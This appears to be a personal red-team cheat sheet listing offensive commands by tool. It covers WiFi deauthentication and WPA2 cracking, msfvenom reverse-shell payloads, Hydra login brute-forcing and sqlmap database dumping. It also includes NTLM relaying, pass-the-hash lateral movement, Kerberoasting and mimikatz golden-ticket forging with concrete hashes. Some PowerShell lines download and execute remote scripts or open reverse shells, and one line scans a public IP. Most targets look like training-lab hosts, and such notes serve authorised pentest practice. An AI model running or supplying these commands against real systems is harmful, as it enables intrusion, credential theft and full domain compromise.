# red_team_notes

Linux Commands
  ifconfig
  iwconfig
  pwd
  cat
  tac
  cd
  rm -rf
  rmdir
  mkdir
  updatedb
  locate
  grep
  apt-get update
  apt-get upgrade
  
Windows Commands
  hostname
  systeminfo
  whoami /groups
  whoami /all

Change MAC
  ifconfig wlan0 down
  ifconfig wlan0 hw ether 00:11:22:33:44:55
  ifconfig wlan0 up

Monitor Mode
  ifconfig wlan0 down
  airmon-ng check kill
  iwconfig wlan0 mode monitor
  ifconfig wlan0 up

SNORT
   sudo snort -c /etc/snort/snort.conf -l /var/log/snort/

Tor
  sudo service tor start

WiFi Scan
  iwconfig
  airodump-ng wlan0

Capture WPA2 Handshake
  airodump-ng --bssid [mac] --channel [ch] --write wpa2_handshake wlan0

Deauthenticate
  aireplay-ng --deauth4 -a [mac] -c [mac] wlan0

Wordlists
  /usr/share/metasploit-framework/data/wordlists/unix_users.txt
  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
  /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  /usr/share/wordlists/rockyou.txt
  /usr/share/wordlists/dirb/common.txt

Generate Wordlist
  crunch <min> <max> [options]

Crack WPA2
  aircrack-ng [handshake_file] -w wordlist

Nessus
  /bin/systemctl start nessusd.service
  https://kali:8834/

MITMProxy
  cd /opt/mitmproxy
  ./mitmweb

MSFVenom
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f exe > shell.exe
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > shell.aspx
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f elf > shell.elf
  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/alpha_mixed -f python

MSFConsole
  msfconsole
  use
  set
  run
  sessions
  sessions -i [id]
  background

Hydra
  hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.56.5 -V http-form-post '/login.php:Username=^USER^&Password=^PASS^&Submit=Login:S=Location'
  hydra -L usernames.txt -P passwords.txt 10.129.28.62 -V http-form-post '/admin:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:S=Location' -s 8080

Python
  python -c 'import pty;pty.spawn("/bin/bash")'
  python -m SimpleHTTPServer 8080
  python3 -m http.server 8080
  
Powershell
  powershell -c "Invoke-WebRequest -Uri 'http://10.2.8.146:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"

SQLMap
  sudo sqlmap -u http://10.10.77.108/vulnerabilities/sqli/?id=1\&Submit=Submit --cookie='PHPSESSID=pnfsn1i25k0i4af1tmvstj7m55; security=low' --dbs
  sudo sqlmap -u http://10.10.77.108/vulnerabilities/sqli/?id=1\&Submit=Submit --cookie='PHPSESSID=pnfsn1i25k0i4af1tmvstj7m55; security=low' -D dvwa --columns
  sudo sqlmap -u http://10.10.77.108/vulnerabilities/sqli/?id=1\&Submit=Submit --cookie='PHPSESSID=pnfsn1i25k0i4af1tmvstj7m55; security=low' -D information_schema --schema
  sudo sqlmap -u http://10.10.77.108/vulnerabilities/sqli/?id=1\&Submit=Submit --cookie='PHPSESSID=pnfsn1i25k0i4af1tmvstj7m55; security=low' -D dvwa --dump
  
WPScan
  wpscan --url '' --api-token='' --enumerate u/vp/vt
  
cameradar
  sudo docker run -t ullaakut/cameradar -t 91.105.153.138
  
CrackMapExec
  crackmapexec smb 10.0.2.0/24 -u user -d DOMAIN.local -p Password
  crackmapexec smb 10.0.2.0/24 -u user -d DOMAIN.local -p Password --shares
  crackmapexec smb 10.0.2.0/24 -u user -d DOMAIN.local -p Password --users
  crackmapexec smb 10.0.2.0/24 -u user -d DOMAIN.local -H HASHES --shares
  crackmapexec smb 10.0.2.0/24 -u user -H HASHES --local-auth
  
Responder
  sudo nano /etc/responder/Responder.conf
  [SMB On][HTTP On]
  sudo responder -I eth0 -dPv
  
NTLMRelayx
  sudo nano /etc/responder/Responder.conf
  [SMB Off][HTTP Off]
  sudo responder -I eth0 -dPv
  python3 ntlmrelayx.py -tf targets.txt -smb2support
  python3 ntlmrelayx.py -tf targets.txt -smb2support -i
  
psexec
  python3 psexec.py DOMAIN.local/user:Password@10.0.2.18

wmiexec
  python3 wmiexec.py DOMAIN.local/user:Password@10.0.2.18
  
smbexec
  python3 smbexec.py DOMAIN.local/user:Password@10.0.2.18
  
Evil-WinRM

rpcclient
  rpcclient -U"%" -N
  enumdomusers

enum4linux
  enum4linux -a 10.0.2.17 -u DOMAIN.local/user -p Password

smbclient
  python3 smbclient.py DOMAIN.local/user:Password@10.0.2.18
  
Load Powershell Script Remotely
  IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15:8080/Invoke-PowerShellTcp.ps1');
  
Reverse Powershell
  nc -lvnp 4444
  Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.15 -Port 4444
  
Enable RDP
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  netsh advfirewall firewall set rule group="remote desktop" new enable=yes
  sc start TermService
  
RDP
  xfreerdp /u:user /d:DOMAIN.local /p:Password /v:10.0.2.18
  
PrivEsc Checks
  SharpUp.exe audit
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  
List Processes
  Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
  
Kerberoasting
  Rubeus.exe kerberoast /user:username /nowrap /outfile:hash.txt
  impacket-GetUserSPNs DOMAIN.local/user:Password -dc-ip 10.0.2.17 -request
  hashcat -m 13100 hash.txt rockyou.txt
  
Golden Ticket
  #mimikatz
  kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt

  .\Rubeus.exe ptt /ticket:ticket.kirbi
  klist #List tickets in memory

  Example using aes key
  kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
  
  python3 ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
  export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
  python3 psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
